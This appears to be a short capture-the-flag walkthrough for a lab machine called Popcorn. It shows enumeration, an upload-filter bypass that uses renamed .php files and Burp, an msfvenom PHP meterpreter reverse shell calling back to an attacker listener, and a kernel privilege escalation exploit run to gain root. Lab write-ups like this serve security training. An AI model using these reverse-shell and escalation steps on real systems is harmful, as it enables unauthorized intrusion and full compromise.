# Popcorn 10.10.10.6


$ nmap -A 10.10.10.6
=> 80

$ dirb http://10.10.10.6
http://10.10.10.6/torrent/

Bittornado is a torrent client. 
Register an account
Upload a torrent
Submit a screenshot : need to upload a .png file

Rename .php => .php.png 

Build a .php reverse shell
msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.3 lport=4321 -f raw  > 123.php.png

Intercept the Post with Burp
Rename 123.php.png to 123.php

dirb http://10.10.10.6/torrent/
http://10.10.10.6/torrent/upload/ 

Prepare a listener
$ msfconsole
msf use exploit/multi/handler
msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp
msf exploit(multi/handler) set lhost 10.10.14.3
msf exploit(multi/handler) set lport 4321
msf exploit(multi/handler) exploit

meterpreter > sysinfo
 Linux popcorn 2.6.31-14
 => Linux Kernel <= 2.6.37 local privilege escalation : full_nelson : 3 Privilege to get root
 https://www.exploit-db.com/exploits/15704

 upload 15704.c
 shell
 gcc 15704.c -o exploit
 chmod 755 exploit
 ./exploit
 id
 uid=0(firefart)
 cat /root/root.txt

 

